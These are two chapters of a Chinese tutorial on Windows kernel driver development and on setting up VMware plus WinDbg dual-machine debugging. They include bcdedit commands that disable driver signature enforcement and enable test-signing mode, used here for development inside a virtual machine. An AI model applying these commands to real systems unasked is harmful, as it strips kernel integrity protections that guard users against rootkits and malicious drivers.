在CPU的所有指令中，有一些指令是非常危险的，如果错用，将导致整个系统崩溃，如：清内存、设置时钟等。如果所有的程序都能使用这些指令，那么系统一天死机N回就不足为奇了。所以CPU将指令分为特权指令和非特权指令，对于那些危险的指令，只允许操作系统及其相关模块使用，普通的应用程序只能使用那些不会造成灾难的指令。 Intel的CPU将特权级别分为4个级别：RING0、RING1、RING2、RING3（简称R0、R1、R2、R3）。R0层拥有最高的权限，R3层拥有最低的权限。按照Intel原有的构想，应用程序工作在R3层，只能访问R3层的数据；操作系统工作在R0层，可以访问所有层的数据；而其他驱动程序位于R1、R2层，每一层只能访问本层以及权限更低层的数据。 这应该是很好的设计，这样操作系统工作在最核心层，没有其他代码可以修改它；其他驱动程序工作在R1、R2层，有要求则向R0层调用，这样可以有效保障操作系统的安全性。 但现在的OS，包括Windows和Linux都没有采用4层权限，而只是使用2层：R0层和R3层，分别来存放操作系统数据和应用程序数据，从而导致一旦驱动加载了，就运行在R0层，即拥有了和操作系统同样的权限，可以做任何事情，而所谓的RootKit（拥有“根权限”的工具）也就随之而生了。 9.2. 驱动模式 ——摘于博文：http://lib.csdn.net/article/dotnet/41373 运行 Windows 的计算机中的处理器有两个不同模式：“用户模式”和“内核模式”。根据处理器上运行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下运行，核心操作系统组件在内核模式下运行。多个驱动程序在内核模式下运行时，某些驱动程序可能在用户模式下运行。 当启动用户模式的应用程序时，Windows 会为该应用程序创建“进程”。进程为应用程序提供专用的“虚拟地址空间”和专用的“句柄表格”。由于应用程序的虚拟地址空间为专用空间，一个应用程序无法更改属于其他应用程序的数据。每个应用程序都孤立运行，如果一个应用程序损坏，则损坏会限制到该应用程序。其他应用程序和操作系统不会受该损坏的影响。 用户模式应用程序的虚拟地址空间除了为专用空间以外，还会受到限制。在用户模式下运行的处理器无法访问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改并且可能损坏关键的操作系统数据。 在内核模式下运行的所有代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其他驱动程序和操作系统自身独立开来。如果内核模式驱动程序意外写入错误的虚拟地址，则属于操作系统或其他驱动程序的数据可能会受到损坏。如果内核模式驱动程序损坏，则整个操作系统会损坏。 9.3. 驱动程序类型 ——摘于博文：http://lib.csdn.net/article/dotnet/41373 WDF提供了两个框架： ① 内核模式驱动程序KMDF（Kernel-Mode DriverFramework）： 这类驱动程序作为内核模式操作系统组件的一部分执行，它们管理I/O、即插即用、内存、进程和线程、安全等。内核模式驱动程序通常为分层结构。KMDF是Windows系统底层驱动，文件名为：*.SYS。关于KMDF更多的内容，可参阅 MSDN中“Getting Started with Kernel-ModeDriver Framework ”。 ② 用户模式驱动程序 UMDF（User-Mode DriverFramework）： 这类驱动程序通常提供 Win32 应用程序与内核模式驱动程序或其他操作系统组件之间的接口。用户模式驱动程序支持基于协议或基于串行总线（如摄像机和便携音乐播放器）的设备。UMDF是用户层驱动，文件名为：*.DLL。关于KMDF更多的内容，可参阅 MSDN中“Introduction to UMDF”。 无论内核模式的驱动程序或者用户模式的驱动程序，都使用同一环境进行构建，这一环境称为WDK；都采用同一套对象模型构建，采用同一个基础承载，这个基础就是WDF。由于WDF驱动模型提供了面向对象和事件驱动的驱动程序开发框架，大大降低了开发难度。使得像WinDriver、DriverStudio之类的第三方工具也随之退出历史舞台。更重要的，也是微软反复炫耀的是封装了驱动程序中的某些共同行为：例如即插即用和电源管理就属于这种共同行为。因为大多数驱动程序中都需要处理即插即用和电源管理问题（据说这大概要上千行的代码，况且没有相当水平还不一定能处理好）。为了一劳永逸，WDF干脆将即插即用和电源管理封装了进了对象之内，成了对象的缺省行为。 WDF将驱动程序与操作系统内核之间进行了分离，驱动程序与操作系统交互工作交给框架内封装的方法（函数）完成，这样驱动开发者只需专注处理硬件的行为即可。这不仅避免了顾此失彼两面不周的弊端，也由于双方的分离，对操作系统内的某些改动，硬件制造商配套驱动程序的开发都有莫大的好处。 9.4. 驱动的签名与认证 从Win Vista/7 x64 系统开始，微软就要求用户必须使用经过数字签署过的驱动。换言之，没有经过数字签名的驱动是不允许安装到x64系统的。 默认情况下，新编译的驱动程序都是没有数字签署的，若要对其进行数字签署，又可以分为两种形式： ① 自签名：包括从正规渠道付费获得的各种EV签名（如wosign、verisigned等），或由开发者本人创建发布的签名（如用64Signer签名，具体信任策略要看本地策略） ② WHQL认证：只能通过微软官方对驱动进行测试并通过后获得的认证（认证过程极其严格、周期长、费用高，不适合个人开发者），凡是通过WHQL认证的产品均会被授予“Designed for Windows”标识。此类别驱动最大的特点是稳定性高，和微软操作系统的兼容性好（几乎100%兼容）。 特别需要注意的是：自签名和WHQL认证不是同一个东西。 自签名只能证明该驱动是来自可靠的发布者，并且内容未被改变（受信任的合法证书也包含在这个范围）；WHQL认证则是说明微软认可这个驱动。 换而言之，即使驱动程序有合法的签名，但没有通过WHQL认证，也是无法被加载的，因为自Win Vista/7 x64 以后的操作系统在加载驱动时所校验的是WHQL认证，不是自签名。 表 2 驱动程序在x64系统的各模式下的可装载情况 - - x64驱动的数字签署方式 - 系统模式（x64） 无数字签署 自签名 WHQL认证 正常模式（默认） 不能装载 不能装载 可以装载 禁用驱动程序签名强制检测模式 不能装载（旧版本系统可以） 不能装载（旧版本系统可以） 可以装载 TestSigning测试模式 不能装载 可以装载 可以装载 注： ① 32位系统不检查WHQL，只会给出警告。 ② 禁用驱动程序签名强制检测模式： 　　　　临时方式（重启后失效）：【开机按F8】 --> 【禁用驱动程序签名强制】（如图 28） 　　　　永久方式（重启后有效）：以管理员身份在DOS控制台输入命令【bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS】 ③ TestSigning测试模式：以管理员身份在DOS控制台输入命令【bcdedit /set testsigning on】 ④ 较旧版本的系统可以只用方式 ② 实现驱动装载，但现在已经失效了，目前只能通过方式 ③ 实现。 然而某些程序（如游戏）会检测系统是否处于测试模式，否则不予运行，避免被非法驱动（如外挂）Hook。 10. 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/re/驱动开发入门2.html":{"url":"markdown/technical/re/驱动开发入门2.html","title":"驱动开发入门2：双机调试环境搭建","keywords":"","body":"驱动开发入门 – 之二：Win7-x64 + VMWare (Win7-x64) + WinDbg 双机调试环境搭建1. 概述1.1. 前言1.2. 名词解析1.3 WinDbg简介2. 操作系统与预装组件3. 相关工具安装4. 安装VMware虚拟机及GuestOS5. 配置VMWare的虚拟管道串口6. 在GuestOS增设调试模式的操作系统7. WinDbg的安装与配置8. 验证WinDbg配置（连接GuestOS）9. 双机调试9.1. 什么是符号文件9.2. 符号文件路径设置9.3. 调试一个驱动程序9.4. 加入断点调试10. 附录1：利用VirtualKD提高调试的传输速率11. 附录2: WinDbg常用命令/操作12. 附录3：WDK（x64）+汇编的混合编译13. 附录4：常见异常解决方案13.1. [error LNK 2019] - unresolved external symbol _DriverEntry@8 referenced in function _GsDriverEntry@813.2. GuestOS安装VirtualKD后若退出TestSigning模式则无法启动Windows14. 资源下载驱动开发入门 – 之二：Win7-x64 + VMWare (Win7-x64) + WinDbg 双机调试环境搭建 1. 概述 1.1. 前言 适读人群：具备良好的C/C++开发经验，一定的逆向工程基础。 前置阅读：《驱动开发入门 - 之一 ：Win7 SP1 x64 驱动开发环境搭建》 为方便起见，在下文中使用【HostOS】指代【物理机/宿主机/调试机】，用【GuestOS】指代【虚拟机/客户机/被调试机】。 WinDbg是一款双机调试工具，它安装在HostOS上，HostOS与GuestOS通过串口相连接，使用时需要在HostOS用WinDbg调试GuestOS上运行的内核程序。 由于使用两台物理机做双机调试的成本较高、可操作性较低，因此本文双机调试的环境是基于物理机（HostOS）与VMWare虚拟机（GuestOS）搭建的。 之所以使用虚拟机搭建双机调试环境，主要出于以下几个方面考虑： ① 驱动程序运行在系统内核，在调测时需要把操作系统设置到测试模式，极大降低安全性。 ② 经验不足的情况下编写内核程序很容易导致系统蓝屏，在HostOS调试风险过大。 ③ HostOS无法调试自己。到VS2010为止的IDE均不支持驱动程序的调试功能，只能在操作系统中加载驱动时调试，而加载驱动程序的操作系统是无法调试自身的（遇到INT3中断的时候整个系统会进入假死状态），因此需要借助GuestOS。 1.2. 名词解析 名词 英文原文 解析 HostOS Host Operating System 物理机/宿主机/调试机 GuestOS Guest Operating System 虚拟机/客户机/被调试机 COM Cluster Communication Port 串行通讯端口 KD Kernel Debug 内核调试 1.3 WinDbg简介 ——部分内容摘于博文：http://blog.csdn.net/keidoekd2345/article/details/50125747 在安装微软Windows调试工具集后，可以在安装目录下发现四个调试器程序，分别是：cdb、ntsd、kd和WinDbg。 其中cdb和ntsd只能调试用户程序，kd主要用于内核调试（有时候也用于用户态调试）。这三者的一个共同特点是都只有控制台界面，以命令行形式工作。 而WinDbg在用户态、内核态下都能够发挥调试功能，特别地，它采用了可视化的用户界面。所以绝大部分情况下，我们在谈及Windows调试工具时都直接指向WinDbg，而不谈及其他三者。 WinDbg支持源码级的调试（类似于VC自带的调试器），而且在用户态和内核态下，都支持两种调试模式，即“实时调试模式（Living）”和“事后调试模式（Postmortem）”。 实时调试模式（Living）：是被调试的目标对象（Target）当前正在运行当中，调试器可以实时分析、修改被调试目标的状态，如寄存器、内存、变量，调试exe可执行程序或双机实时调试都属于这种模式。 事后调试模式（Postmortem）：是被调试的目标对象（Target）已经结束了，现在只是事后对它保留的快照进行分析，这个快照称为转储文件（Dump文件）。 2. 操作系统与预装组件 ① HostOS系统版本： Win7 SP1 x64 （必须升级到SP1版本） ② GuestOS系统版本： Win7 SP1 x64 （必须升级到SP1版本） ③ 在HostOS安装VS2010驱动开发环境的相关组件（详见《驱动开发入门 - 之一》，此处不再复述），之所以选择VS2010环境，是因为VS2008在x64环境下的混合汇编能力较弱，不便于后续的开发调试工作。 3. 相关工具安装 表 1 工具清单 目标机器 工具 版本 用途 备注 下载 HostOS VS2010驱动开发环境的相关组件 HostOS VMWare 11.1.2 安装GuestOS的虚拟机 用于搭建隔离环境调试驱动程序   HostOS WinDbg 6.11 Windows平台下的驱动程序调试工具 用于配合GuestOS双机调试驱动程序 官方地址CSDN HostOS windbg-双机调试.bat 6.11 使得windbg连接到GuestOS的启动脚本 配合WinDbg使用，已固化启动参数 CSDN HostOS Win7符号文件 Win7SP1x64 WinDbg调试代码用 相当于Win系统内核程序的源码文件 官方地址 GuestOS 开启win测试环境.bat关闭win测试环境.bat 调测环境变更脚本 把操作系统永久切换到测试模式并关闭驱动签名校验 CSDN GuestOS DriverMonitor 3.2.0 驱动程序装载器 XP x86用于安装、启动内核程序的调试工具，Win7 x64可能不兼容 CSDN GuestOS InstDrv 1.3.0 驱动程序装载器 Win7用于安装、启动内核程序的调试工具 CSDN GuestOS DebugView 4.81 内核驱动消息捕获器 配合DriverMonitor或InstDrv使用，用于捕获内核程序的DbgPrint / KdPrint语句所打印消息 CSDN HostOSGuestOS VirtualKD 3.0 内核调试加速器 配合WinDbg使用，提高HostOS与GuestOS传输速率 官方地址 4. 安装VMware虚拟机及GuestOS 由于VMWare11之后的虚拟机和系统安装都比较简单，此处就不详述了，仅说明一下步骤： ① 在HostOS安装VMWare虚拟机 ② 在虚拟机安装Win7 x64 SP1操作系统（GuestOS） ③ 为了便于HostOS与GuestOS的文件交互，安装VMWare Tools（VMWare 已自带：【菜单】 --> 【虚拟机】 --> 【安装VMWare Tools】） ④ 在GuestOS中执行【开启Windows测试环境.bat】脚本使GuestOS关闭驱动签名校验，并进入测试模式 ⑤ 在GuestOS中安装 DriverMonitor / InstDrv 和 DebugView [!NOTE|style:flat|label:注意] 若第 ④ 步的脚本下载地址已失效，可手动在GuestOS的DOS控制台输入以下命令： 【开启Windows测试环境.bat】脚本主要是两个指令： bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS // 关闭驱动数字签名校验 bcdedit /set testsigning on // 开启系统测试模式   【关闭Windows测试环境.bat】脚本是配套的两个还原指令： bcdedit -set loadoptions DENABLE_INTEGRITY_CHECKS // 启动驱动数字签名校验 bcdedit /set testsigning off // 关闭系统测试模式 5. 配置VMWare的虚拟管道串口 当双机都是物理机时，HostOS与GuestOS是用物理串口连接的。 但是在GuestOS是虚拟机的情况下，就不可能使用物理串口了，此时需要在GuestOS上设置一个用虚拟的管道串口，步骤如下： ① 在虚拟机关机状态下，选择【编辑虚拟机设置】，如图 1。 ② 在【硬件】选项卡【移除打印机】，如图 2。 这是因为打印机默认占用了串口COM_1，为了使得下文的配置无需修改，这里建议删除打印机（不删除打印机也可以，但后面的配置请自行修改为COM_2作为管道串口命名） ③ 添加一个串行端口：【添加】 --> 【串行端口】 --> 【下一步】 --> 【输出到命名管道】 --> 【下一步】，如图 3和图 4。 ④ 如图 5设置如下值，点击【完成】按钮。 命名管道：\\.\\pipe\\com_1 （会自动填上编号最小的可用串口） 【该端是服务器。】 【另一端是应用程序。】 【勾上】启动时连接。 ⑤ 最后回到如图 6所示的界面，选中刚才新建的【串行端口】，在I/O模式【勾选】轮询时主动放弃 CPU(Y)，点击【确定】即可。 6. 在GuestOS增设调试模式的操作系统 首先区分GuestOS中操作系统的几种模式： 正常模式：初装操作系统时的默认状态 测试模式：利用bcdedit命令打开系统的TestSigning开关，使系统处于可以装载未认证驱动程序的状态（若已按上文所述操作，当前的GuestOS已处于此状态） 调试模式：利用bcdedit命令打开系统的debug和bootdebug 开关，使系统上运行的程序处于可以被另一个系统调试的状态 本节的最终目标就是在 [测试模式] 的基础上再增加 [调试模式]，更具体地描述，就是在开机的操作系统列表中新增一个被标识为【启用调试程序】的操作系统，如图 7所示（其中“Win-7双击调试模式”是自定义的系统名称，“启用调试程序”表示该系统处于调试模式） 在XP时代，通过修改C:\\boot.ini配置文件可以实现此目的。但Win7系统已经没有这个文件了，需要通过bcdedit命令进行配置。 详细的配置方式如下： ① 虚拟机开机后，正常登陆到Win7系统桌面（若已按照上文配置，当前所登陆到的Win7系统正处于【测试模式】，可以通过桌面右下角的水印验证，如图 8所示。某些系统会屏蔽这个水印，此时可以通过命令【bcdedit /enum】确认testsigning的值是否为Yes以判断系统当前是否处于测试模式）。 ② 如图 9和图 10所示，以管理员身份运行DOS控制台在控制台中依次输入以下命令： bcdedit /copy {current} /d \"Win7-双机调试模式\" // 这是系统副本的名字，任意即可 bcdedit /timeout 10 这两条命令的作用是把当前所登陆的操作系统，复制一份副本，命名为【Win7-双机调试模式】。新的系统会出现在开机时的操作系统列表中，该列表的呈现时间为10秒。 ③ 重启GuestOS，此时可以看到在操作系统列表中多出第一项【Win7-双机调试模式】，这就是刚才复制的系统副本。选择这个系统登陆到桌面。 ④ 以管理员身份运行DOS控制台，在控制台中依次输入以下命令使得系统进入调试模式： bcdedit /debug ON bcdedit /bootdebug ON 再输入以下命令可查看操作系统在调试模式下使用的串口配置： bcdedit /dbgsettings 如图 12所示为调试模式的配置参数，其中【debugtype=Serial】表示使用串口做调试，【debugport=1】表示串口端口为COM_1，【baudrate=115200】为波特率，表示HostOS与GuestOS通过此虚拟串口交换数据的传输速率（约等效于10KB/s，暂时保持默认值即可）。 这里需要注意的是，若上文小节【5 配置VMWare的虚拟的管道串口】中所配置的串口不是COM_1，这里可以使用以下命令 修改串口号等 调试模式的参数： bcdedit /dbgsettings serial debugport:1 baudrate:115200 ⑤ 到此就已经成功添加了一个调试模式的操作系统了，重启后可在系列列表中看见【Win-7双击调试模式 [启用调试程序]】（如图 13），这个就是之后要用来调试驱动用的系统。 ⑥ 为了便于之后开机后都处于调试模式，可以通过右键【计算机】 --> 【属性】 --> 【高级系统设置】 --> 【高级】 --> 【启动和故障恢复】 --> 【设置】 修改默认的操作系统、以及操作系统列表的显示时间，如图 14所示： 7. WinDbg的安装与配置 只有HostOS需要安装WinDbg，步骤如下： ① 安装dbg_x86_6.11.1.404.msi到HostOS任意位置 ② 复制windbg_cn.exe到安装目录（此为汉化界面入口） ③ 复制 [windbg_cn-双机调试.bat] 和 [windbg-双机调试.bat] 脚本到安装目录（这两个脚本功能相同，区别只是一个汉化版、一个英文版） ④ 根据上文设置的虚拟管道串口，右键编辑bat脚本的启动参数（若使用COM_1串口则无需修改）： start \"\" windbg_cn.exe -b -k com:pipe,port=\\.\\pipe\\com_1,baud=115200,reconnect -y 　　// 中文脚本 start \"\" windbg.exe -b -k com:pipe,port=\\.\\pipe\\com_1,baud=115200,reconnect -y 　　// 英文脚本 8. 验证WinDbg配置（连接GuestOS） ① 启动虚拟机，进入【win7-双机调试模式 [启动调试程序]】系统（注：调试模式的系统在启动过程有两个系统断点，若不通过WinDbg跳过断点，系统会陷入中断状态无法进入桌面）。 ② 运行 [windbg_cn-双机调试.bat] 脚本，若脚本配置的启动参数与GuestOS设置的虚拟管道串口参数一致，则可以明显看到宿主系统和虚拟系统连接成功的提示，如图 15。 ③ 在系统启动过程中，会出现多次【int 3】系统中断，需要在WinDbg的【kd>】中输入命令【g】以跳过中断，直到登陆到桌面。 ④ 成功进入桌面后，就可以开始使用WinDbg做双机调试。 9. 双机调试 9.1. 什么是符号文件 类似于在C/Java的IDE中调试源码，WinDbg在调试驱动程序时也需要用到源码，在Windows中把这种源码称之为符号文件（Symbol Files）。 符号文件是一个数据信息文件，以*.pdb扩展名标识。它包含了应用程序二进制文件（如*.sys、*.dll、*.exe）的调试信息（如程序中所有变量信息），专用于调试。符号文件与二进制文件的编译版本密切，当二进制文件被重新编译时，上次编译所产生的pdb文件就过时了，不能再用于调试工作。 用 Visual C++ 和 WinDbg 调试程序时都要用到符号文件，但最终生成的可执行文件在运行时并不需要符号文件。 例如每个 Windows 操作系统下有一个 GDI32.dll 文件，编译器在编译该 DLL 的时候会产生一个 GDI32.pdb 文件。一旦我们拥有了这个GDI32.pdb文件，那么便可以用它来调试并跟踪到 GDI32.dll 内部。 9.2. 符号文件路径设置 WinDbg是支持在调试时自动在线下载对应符号文件的。但是符号文件内容也不少（某些符号文件在线下载需要几分钟，不便于调试），建议把离线安装包下载到本地先预安装。 这个是微软提供的各个Windows版本的符号路径下载的站点： https://developer.microsoft.com/en-us/windows/hardware/download-symbols 以本文所采用的操作系统版本为例，选择【Windows 7 Service Pack 1 x64 retail symbols, all languages】下载，如图 16： 下载成功后，将其安装到HostOS的任意位置即可。 本文所选择的符号文件安装目录为：E:\\04_work\\re\\Symbol 安装成功后，配置环境变量： ① 右击【计算机】-->【属性】-->【高级系统设置】-->【高级选项卡】-->【环境变量】 ② 在【系统变量】中新建四个变量： 变量名 变量值 备注 _NT_SYMBOL_DIR E:\\04_work\\re\\Symbol 符号文件安装目录 _NT_SYMBOL_PATH %_NT_SYMBOL_DIR%;symsrv*symsrv.dll*%_NT_SYMBOL_DIR%*http://msdl.microsoft.com/download/symbols 符号文件检索位置 _NT_SOURCE_PATH 根据实际情况按需配置（可不配） 编译驱动生成的符号文件目录 _NT_ALT_SYMBOL_PATH 根据实际情况按需配置（可不配） 其他符号文件目录 注： 在环境变量 _NT_SYMBOL_PATH 指定了两个路径:第一个是本地符号文件安装目录，第二个是在线符号文件站点。 它表示如果在本地安装目录%_NT_SYMBOL_DIR%下找不到所需的Symbol File，就从微软的Symbol Server上下载并保存到%_NT_SYMBOL_DIR%目录。 重新运行WinDbg连接到GuestOS，从控制台的连接信息可以看到WinDbg已成功找到符号文件路径位置。点击【文件】 --> 【符号文件路径】 可以发现系统变量 _NT_SYMBOL_PATH 所指定的符号文件路径已被加载到WinDbg，如图 17所示： 9.3. 调试一个驱动程序 以之前的VS2010_WDK_Demo驱动项目为例（该项目通过EasySYSchs生成，已生成模板代码，编译后可直接被系统加载运行，详见《驱动开发入门 - 之一》，此处不再复述）。 在VS2010_WDK_Demo.cpp中找到入口函数DriverEntry，使用DbgPrint函数打印一句内核调试消息，如图 18： 重新编译并签名VS2010_WDK_Demo驱动项目，拷贝VS2010_WDK_Demo.sys到GuestOS中，并使用DriverMonitor / InstDrv装载并启动该驱动，则可以在WinDbg中捕获到刚才添加的内核消息“Hello, Driver By VS2010”，如图 19所示。 9.4. 加入断点调试 由于驱动程序中没有断点，驱动程序被装载后转瞬就运行完了。 为了便于调试，这次在驱动程序的入口函数DriverEntry中加入INT 3系统中断的汇编代码，如图 20所示（此处只演示效果，暂不说明如何在x64系统中嵌入汇编代码，若有需要了解可见附录）： 重新编译并签名VS2010_WDK_Demo驱动项目。 把HostOS编译目录中生成的符号文件VS2010_WDK_Demo.pdb设置到WinDbg中（【文件】 --> 【源文件路径】），使得WinDbg可以在调试过程中查看驱动程序的源码，如图 21所示。 然后拷贝驱动程序VS2010_WDK_Demo.sys到GuestOS中，签名后使用DriverMonitor / InstDrv装载并启动该驱动，此时GuestOS因为系统中断会陷入假死状态，按【Ctrl+Alt】释放鼠标到HostOS，发现WinDbg已运行到断点位置并暂停，如图 22所示。 在WinDbg上方的工具栏提供了对驱动程序做调试的按钮，左侧为源码区，右侧则是控制台，如图 23所示为单步调试的过程。 熟悉WinDbg的使用后，其他驱动程序的调试方式也是大同小异，此处就不再一一叙述了。 10. 附录1：利用VirtualKD提高调试的传输速率 在调试的过程中可能会发现WinDbg经常会不断打印一堆意义不明XML stream消息刷屏（如图 24），在打印期间WinDbg与GuestOS均处于无法操作的假死状态。 SXS.DLL: Read 0 bytes from XML stream; HRESULT returned = 0x00000001 SXS.DLL: Creating 8828 byte file mapping C:\\Users\\Administrator\\Desktop\\DriverGenius\\security\\kxescan\\kfc_dps.datSXS.DLL: Read 756 bytes from XML stream; HRESULT returned = 0x00000000 　00000000: 3c-3f-78-6d-6c-20-76-65-72-73-69-6f-6e-3d-22-31 ( 　00000010: 2e-30-22-20-65-6e-63-6f-64-69-6e-67-3d-22-55-54 (.0\" encoding=\"UT) 　00000020: 46-2d-38-22-20-73-74-61-6e-64-61-6c-6f-6e-65-3d (F-8\" standalone=) 　00000030: 22-79-65-73-22-3f-3e-0d-0a-3c-21-2d-2d-20-43-6f (\"yes\"?>.. 　00000040: 70-79-72-69-67-68-74-20-28-63-29-20-4d-69-63-72 (pyright (c) Micr) 　00000050: 6f-73-6f-66-74-20-43-6f-72-70-6f-72-61-74-69-6f (osoft Corporatio) 　00000060: 6e-20-2d-2d-3e-0d-0a-3c-61-73-73-65-6d-62-6c-79 (n -->.. 这种消息实际上是HostOS与GuestOS在交互数据，当在GuestOS打开某些进程时就可能会触发。当需要交互的数据量很大的时候，就会造成WinDbg与GuestOS双双陷入假死状态，直到数据交互完成。那么要解决假死状态的方法自然就是想办法使得HostOS与GuestOS尽快完成数据交互。 在前面配置虚拟管道串口的时候，有一个波特率参数，默认值就是【baudrate=115200】，该值直接制约了HostOS与GuestOS交互数据的传输速率（115200 baudrate等效于115200 bit per secon，约为10KB/s）。但是串口波特率的取值范围为300、600、1200、2400、4800、9600、19200、38400、43000、56000、57600、115200，可以发现默认值已经是最大值了，无法再上调波特率。 为此需要借助MS提供的另一个工具VirtualKD：其原理是先在HostOS与GuestOS预装后门进程，然后利用KD的扩展DLL功能向GuestOS附加到这个进程产生一条虚拟管道，WinDbg可以借助该管道在HostOS与GuestOS之间进行调试。相比于使用串口，VirtualKD的数据交互速率有极大的提升（微软官方测试速率最高为6MB/S，即使在VMWare平台也可达到150KB/s）。 VirtualKD的安装和使用都比较简单，具体步骤如下： ① 把从官方下载的VirtualKD.exe在HostOS与GuestOS中分别拷贝一份。 ② 分别在HostOS与GuestOS中运行VirtualKD.exe解压 ③ 在GuestOS中运行解压目录中的 \\target\\vminstall.exe，由于是非Win10系统，必须取消勾选【Replace kdcom.dll】，其他参数可以不修改，点击【install】按钮安装（如图 25），安装成功后会提示重启 ④ 重启后在操作系统列表会新增一个系统副本，副本名称就是刚才定义的名称，使用它进入系统（如图 26） ⑤ 在HostOS中运行解压目录中的vmmon64.exe，点击【Debugger path...】按钮选择WinDbg安装目录下的【windbg.exe】（此方式不支持选择汉化版的入口），最后点击【Run debugger】，VirtualKD会自动启动WinDbg并连接到GuestOS（如图 27）。 ⑥ 在WinDbg调试期间不能关闭VirtualKD进程 11. 附录2: WinDbg常用命令/操作 可跳转到此页面查询： WinDbg 命令手册 12. 附录3：WDK（x64）+汇编的混合编译 ——部分内容摘于博文：http://blog.csdn.net/cosmoslife/article/details/9071949 使用WinDbg调试驱动程序的时候，已经涉及代码编写了。而其中一个泛用的特例就是在C/C++代码中嵌套汇编的INT3系统中断指令。 因此此节详细说明一下如何在x64的C/C++驱动程序中嵌入汇编代码，并将其编译到一起。 在x86的编译平台中是支持使用__asm{ ... }语法进行内联汇编的，亦即可以直接把汇编代码直接写到C/C++代码之中，例如： NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path) { DbgPrint(\"This is x86 C/C++\"); __asm { int 3 ; 系统中断 } DbgPrint(\"This is x86 C/C++\"); return STATUS_SUCCESS; } 但是在x64编译平台是不支持内联汇编的。 x64平台要求把汇编代码统一写到 *.asm 文件中，通过汇编编译器（VS默认为ml64.exe）编译成 *.obj 目标文件，最后与 C/C++ 代码的目标文件link到一起生成*.exe可执行文件（或*.sys驱动文件）。 在WDK驱动项目中，详细的操作方式如下（这里还是以在之前的VS2010_WDK_Demo驱动项目中添加INT3系统中断为例）： ① 在WDK项目中新建文件夹asm，再新建文件fun.asm（文件名任意，后缀必须为*.asm） ② 在fun.asm中编写INT3系统中断汇编代码： .CODE ; 声明为代码段，类似的还有.DATA数据段 int_3 PROC ; 函数/过程，红色部分是其名称，可被C/C++声明后直接调用 int 3 ret int_3 ENDP END ③ 如图 28，在VS2010_WDK_Demo.h 头文件的 extern \"C\" { ... } 代码块中添加汇编函数的外部声明，使其可以被调用C/C++代码（至于为什么要在extern \"C\"修饰符内做函数声明，可见附录4的【13.1 [error LNK 2019] 】）： extern \"C\" { ...... void int_3(void); ...... } ④ 之后就可以在VS2010_WDK_Demo.cpp 源文件中直接调用 int_3() 函数了，如图 29： ⑤ 但是现在WDK工程还不能编译成功，原因是WDK不知道如何编译fun.asm文件。为此需要再为*.asm文件指定一套编译规则，方法如下： 右键【项目】 --> 【生成自定义】 --> 勾选【masm】，这组操作意为为WDK项目增加汇编文件的编译规则MASM（如图 30）。 ⑥ 右键【fun.asm】 --> 【属性】 --> 【配置属性】 --> 【常规】 --> 【项类型】 --> 【 Microsoft Macro Assembler】（此选项只有在执行第⑤步后才会出现） --> 【应用】，这组操作意为使用默认的MASM编译器编译*.asm文件（如图 31）。 ⑦ 之后左侧会增加一项【Microsoft Macro Assembler】，这就是MASM编译器的配置项。 点击【Command Line】查看编译脚本： x64平台的编译脚本为ml64.exe， Win32平台的编译脚本为ml.exe（如图 32）。 由于当前工程是64位WDK项目，因此若编译脚本不是ml64.exe，需要在配置管理器新增x64平台。 ⑧ （重要）点击【Object File】查看*.asm文件编译所生成的目标文件*.obj的输出位置。由于配置值使用了宏变量，可【点击配置值】 --> 【下拉】 --> 【编辑】 --> 【宏】，找到对应的变量查看其真实值。 如图 33所示，配置值为【$(IntDir)%(FileName).obj】。 其中$(IntDir)为宏变量，查得其值为x64\\amd64\\ %(FileName)泛指所编译的*.asm文件名称（不含后缀），如当前所编译的fun.asm文件，%(FileName)的值则为fun。 因此对于fun.asm汇编文件而言，$(IntDir)%(FileName).obj的真实值为x64\\amd64\\fun.obj，记下这个值。 ⑨ 驱动工程是通过WDK的build命令进行编译的（在VS2010中是驱动工程目录下的BuildDrv.bat脚本），但是build命令不会自动LINK到*.asm汇编文件的目标文件，直接影响就是在编译*.cpp源文件时，找不到*.asm汇编文件所声明的函数。 为此需要告诉build脚本，在编译*.cpp的时候要和哪些*.asm的目标文件进行LINK。 事实上，*.asm是先于*.cpp被编译成目标文件的，亦即在编译*.cpp的时候，可以把*.asm的目标文件作为*.cpp的库文件，而*.asm的目标文件位置，在第⑧步的时候已经查到了。 尔后只需要修改WDK的sources文件，添加属性项【TARGETLIBS】，指定值为*.asm的目标文件（在本例中就是x64\\amd64\\fun.obj），如图 34所示。 ⑩ 最后编译项目：【生成】-->【（重新）生成解决方案】，如无意外则编译成功，如图 35： 注： 在64位驱动工程中混合汇编编译的方式，暂时只适用于VS2010。 在VS2008的驱动工程中，即使使用相同步骤配置，其DDK的build.bat脚本却无法调用MASM编译器ml64.exe对\\.asm汇编文件进行编译，亦即在编译*.cpp时无法自动得到*.asm的目标文件并进行LINK。* 13. 附录4：常见异常解决方案 13.1. [error LNK 2019] - unresolved external symbol _DriverEntry@8 referenced in function _GsDriverEntry@8 #include VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"load Driver\\r\\n\"); } NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path) { DbgPrint(\"Hello, WDK Demo!\"); driver->DriverUnload=DriverUnload; return STATUS_SUCCESS; } 以上述驱动程序源码为例，在使用VS2008 / VS2010 编译时报错如下： 1>DDKBLD: ================ Build warnings ======================= 1>1>BufferOverflowK.lib(gs_support.obj) : error LNK2019: unresolved external symbol _DriverEntry@8 referenced in function _GsDriverEntry@8 1>1>d:\\01_wor~1\\c\\vs2008\\re\\helloddk\\helloddk\\bufferoverflowk.lib(gs_support.obj) : error LNK2019: unresolved external symbol _DriverEntry@8 referenced in function _GsDriverEntry@8 1>1>d:\\01_wor~1\\c\\vs2008\\re\\helloddk\\helloddk\\objchk_win7_x86\\i386\\HelloDDK.sys : fatal error LNK1120: 1 unresolved externals 1>1>d:\\01_wor~1\\c\\vs2008\\re\\helloddk\\helloddk\\objchk_win7_x86\\i386\\helloddk.sys : error LNK1120: 1 unresolved externals 1>DDKBLD: ======================================================= 异常原因： 这是一个链接错误，表示系统在链接时找不到入口函数_DriverEntry@8。 在VS2008 / 